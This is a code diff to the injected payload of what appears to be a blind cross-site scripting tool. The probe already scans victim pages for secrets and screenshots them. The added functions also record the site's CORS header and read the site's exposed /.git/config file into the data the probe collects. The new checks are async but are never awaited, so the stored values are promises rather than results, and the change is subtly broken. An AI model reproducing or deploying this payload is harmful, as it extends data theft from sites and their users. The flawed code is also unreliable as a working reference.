@@ -79,6 +79,26 @@ function base64_to_blob(base64Data, contentType) {
     return new Blob(byteArrays, { type: contentType });
 }
 
+let check_cors = async function(){
+    let res = await fetch("", {method: 'HEAD'})
+    for (const header of res.headers){
+        if (header[0].toLowerCase() == "access-control-allow-origin"){
+            return header[1];
+        }
+    }
+    return false
+}
+
+let check_git = async function(){
+
+    let res = await fetch("/.git/config");
+    let text = await res.text();
+    if (text.startsWith("[core]")){
+        return text
+    }
+    return false
+}
+
 function get_guid() {
     var S4 = function() {
        return (((1+Math.random())*0x10000)|0).toString(16).substring(1);
@@ -297,6 +317,16 @@ function hook_load_if_not_ready() {
             probe_return_data['secrets'] = look_for_secrets(never_null( document.documentElement.outerHTML ));
         } catch ( e ) {
             probe_return_data['secrets'] = [];
+        }
+        try{
+            probe_return_data['CORS'] = check_cors();
+        } catch (e) {
+            probe_return_data['CORS'] = false;
+        }
+        try{
+            probe_return_data['gitExposed'] = check_git();
+        } catch (e) {
+            probe_return_data['gitExposed'] = false;
         }
         probe_return_data['secrets'] = JSON.stringify(probe_return_data['secrets']);
         html2canvas(document.body).then(function(canvas) {
